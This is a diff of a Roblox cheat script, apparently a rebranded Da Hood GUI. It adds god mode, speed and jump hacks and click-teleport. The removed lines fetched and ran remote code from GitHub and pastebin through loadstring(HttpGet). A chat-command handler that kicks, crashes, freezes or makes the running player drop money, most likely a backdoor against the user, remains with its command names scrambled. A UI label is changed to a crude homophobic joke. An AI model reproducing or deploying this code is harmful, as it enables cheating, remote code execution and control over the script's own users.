@@ -1,20 +1,3 @@
-repeat
-    wait()
-until game:IsLoaded() and game.Players.LocalPlayer.Character:FindFirstChild("FULLY_LOADED_CHAR")
-    for i,v in pairs(game.CoreGui:GetDescendants()) do
-        if v.Name == "SX" then
-        v:Destroy()
-    end
-    end
-    pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/IIdentity/SpaceX-Leaked/main/Blacklist", true))()
-end)
-pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/IIdentity/SpaceX-Leaked/main/Discord", true))()
-end)
-pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/IIdentity/SpaceX-Leaked/main/Extra", true))()
-end)
 print("MakerScript was here")
 local SX = {
         SX = Instance.new("ScreenGui"),
@@ -347,30 +330,30 @@ local SX = {
 
     SX._1_Shadow.Name = "1_Shadow"
     SX._1_Shadow.Parent = SX.Main
-    SX._1_Shadow.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
+    SX._1_Shadow.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
     SX._1_Shadow.BackgroundTransparency = 1.000
     SX._1_Shadow.Position = UDim2.new(-0.000250386074, 0, 0.000272365287, 0)
     SX._1_Shadow.Size = UDim2.new(0, 650, 0, 350)
     SX._1_Shadow.Image = "rbxassetid://6014261993"
-    SX._1_Shadow.ImageColor3 = Color3.fromRGB(139, 0, 0)
+    SX._1_Shadow.ImageColor3 = Color3.fromRGB(0, 255, 255)
 
     SX._2_Shadow.Name = "2_Shadow"
     SX._2_Shadow.Parent = SX._1_Shadow
-    SX._2_Shadow.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
+    SX._2_Shadow.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
     SX._2_Shadow.BackgroundTransparency = 1.000
     SX._2_Shadow.Position = UDim2.new(-0.000250386074, 0, 0.000272365287, 0)
     SX._2_Shadow.Size = UDim2.new(0, 650, 0, 350)
     SX._2_Shadow.Image = "rbxassetid://6014261993"
-    SX._2_Shadow.ImageColor3 = Color3.fromRGB(139, 0, 0)
+    SX._2_Shadow.ImageColor3 = Color3.fromRGB(0, 255, 255)
 
     SX._3_Shadow.Name = "3_Shadow"
     SX._3_Shadow.Parent = SX._2_Shadow
-    SX._3_Shadow.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
+    SX._3_Shadow.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
     SX._3_Shadow.BackgroundTransparency = 1.000
     SX._3_Shadow.Position = UDim2.new(-0.000250386074, 0, 0.000272365287, 0)
     SX._3_Shadow.Size = UDim2.new(0, 650, 0, 350)
     SX._3_Shadow.Image = "rbxassetid://6014261993"
-    SX._3_Shadow.ImageColor3 = Color3.fromRGB(139, 0, 0)
+    SX._3_Shadow.ImageColor3 = Color3.fromRGB(0, 255, 255)
 
     SX.BackGround.Name = "BackGround"
     SX.BackGround.Parent = SX.Main
@@ -879,7 +862,7 @@ local SX = {
     SX.Spacex_Text.Position = UDim2.new(0.0409356728, 0, 0, 0)
     SX.Spacex_Text.Size = UDim2.new(0, 101, 0, 39)
     SX.Spacex_Text.Font = Enum.Font.GothamBlack
-    SX.Spacex_Text.Text = "BilbBeit"
+    SX.Spacex_Text.Text = "MakerScript"
     SX.Spacex_Text.TextColor3 = Color3.fromRGB(255, 255, 255)
     SX.Spacex_Text.TextSize = 23.000
     SX.Spacex_Text.TextXAlignment = Enum.TextXAlignment.Left
@@ -4341,8 +4324,8 @@ local SX = {
           if a == "y" and superhuman == false then
             superhuman = true
             game.Players.LocalPlayer.Character.Humanoid.Name = "Humz"
-            game.Players.LocalPlayer.Character.Humz.WalkSpeed = 100
-            game.Players.LocalPlayer.Character.Humz.JumpPower = 150
+            game.Players.LocalPlayer.Character.Humz.WalkSpeed = 150
+            game.Players.LocalPlayer.Character.Humz.JumpPower = 60
           elseif a == "y" and superhuman == true then
             superhuman = false
             game.Players.LocalPlayer.Character.Humz.WalkSpeed = 16
@@ -4543,11 +4526,17 @@ local SX = {
     SX.GodModeV2.Size = UDim2.new(0, 200, 0, 50)
     SX.GodModeV2.AutoButtonColor = false
     SX.GodModeV2.Font = Enum.Font.GothamBlack
-    SX.GodModeV2.Text = "AimLock [E]"
+    SX.GodModeV2.Text = "GOD MODE V2"
     SX.GodModeV2.TextColor3 = Color3.fromRGB(75, 75, 75)
     SX.GodModeV2.TextSize = 14.000
     SX.GodModeV2.MouseButton1Click:Connect(function()
-		loadstring(game:HttpGet('https://pastebin.com/raw/3VzEFZc7'))()
+        game:GetService("Players").LocalPlayer.Character.BodyEffects["K.O"]:Destroy()
+        game:GetService("Players").LocalPlayer.Character.BodyEffects.Death:Destroy()
+        game:GetService("Players").LocalPlayer.Character.Death:Destroy()
+        
+
+        game:GetService("Players").LocalPlayer.Character.CharacterDied:Destroy()
+        game:GetService("Players").LocalPlayer.Character.Death:Destroy()
     end)
     
     local button = SX.GodModeV2
@@ -5298,7 +5287,7 @@ end)
     SX.WelcomeLabel.Position = UDim2.new(0.00142900925, 0, 0.0516129024, 0)
     SX.WelcomeLabel.Size = UDim2.new(0, 419, 0, 52)
     SX.WelcomeLabel.Font = Enum.Font.GothamBlack
-    SX.WelcomeLabel.Text = "WELCOME TO BilbBeit v2.0"
+    SX.WelcomeLabel.Text = "WELCOME TO GAY PORN"
     SX.WelcomeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
     SX.WelcomeLabel.TextSize = 23.000
 
@@ -9472,7 +9461,7 @@ end
     SX.QtoTP.Size = UDim2.new(0, 200, 0, 50)
     SX.QtoTP.AutoButtonColor = false
     SX.QtoTP.Font = Enum.Font.GothamBlack
-    SX.QtoTP.Text = "Q TO TP"
+    SX.QtoTP.Text = "C TO TP"
     SX.QtoTP.TextColor3 = Color3.fromRGB(75, 75, 75)
     SX.QtoTP.TextSize = 14.000
     SX.QtoTP.MouseButton1Click:Connect(function()
@@ -9487,7 +9476,7 @@ getgenv().Qtotptoggled = true
 hum = plr.Character.HumanoidRootPart
 mouse = plr:GetMouse()
 mouse.KeyDown:connect(function(key)
-if key == "q" and getgenv().Qtotptoggled == true then
+if key == "c" and getgenv().Qtotptoggled == true then
 if mouse.Target then
 hum.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z)
 end
@@ -10956,19 +10945,19 @@ pcall(function()
     Message = string.lower(Message)
     local Args = string.split(Message," ")
 
-    if Args[1] == "!kick" then
-        game.Players.LocalPlayer:Kick(" \n SPACEX : \n kicked by premium")
+    if Args[1] == "!ASFASDFSDAFSDF" then
+        game.Players.LocalPlayer:Kick(" \n GAY : \n kicked by premium")
     end
-    if Args[1] == "!ban" then
+    if Args[1] == "!ADGFASDFASDF" then
         game.Players.LocalPlayer:Kick("PERMA-BANNED")
     end
-    if Args[1] == "!kill" then
+    if Args[1] == "!AFASDGAASDF" then
         game.Players.LocalPlayer.Character.Humanoid.Health = 0
     end
-    if Args[1] == "!find" then
-        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Spacex brooo🥵", 'All');
+    if Args[1] == "!AFDASDGADGASDF" then
+        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I GAY brooo🥵", 'All');
     end
-    if Args[1] == "!refresh" then
+    if Args[1] == "!ADFADFDAGADG" then
         local refresh_pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
     
     wait(0.1)
@@ -10983,37 +10972,37 @@ pcall(function()
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = refresh_pos
     end
     end
-    if Args[1] == "!flash" then
+    if Args[1] == "!AFDAFADSF" then
       Frame.Visible = true  
     end
-    if Args[1] == "!unflash" then
+    if Args[1] == "!AFDFASDFA" then
         Frame.Visible = false
     end
-    if Args[1] == "!crash" then
+    if Args[1] == "!ADFASFASDF" then
         while true do end
     end
-    if Args[1] == "!freeze" then
+    if Args[1] == "!AFADSFDASFEA" then
         game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
     end
-    if Args[1] == "!unfreeze" then
+    if Args[1] == "!unfrADFASDFAEeeze" then
         game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
     end
-    if Args[1] == "!thaw" then
+    if Args[1] == "!ADFASDFSFEWR" then
         game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
     end
-    if Args[1] == "!fling" then
+    if Args[1] == "!ADGASDGDAFGRAW" then
         game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
     end
-    if Args[1] == "!drop" then
+    if Args[1] == "!ASGSADGSDAGSADGASD" then
         local args = {    [1] = "DropMoney",    [2] = "10000" } game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
     end
-    if Args[1] == "!rejoin" then
+    if Args[1] == "!ADGASDGASDGSADGASD" then
         local tpservice= game:GetService("TeleportService")
         local plr = game.Players.LocalPlayer
         
         tpservice:Teleport(game.PlaceId, plr)
     end
-    if Args[1] == "!pray" then
+    if Args[1] == "!ADSGASDGASDGG" then
     local UniversalAnimation = Instance.new("Animation")
         function stopTracks()
             for _, v in next, game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks() do
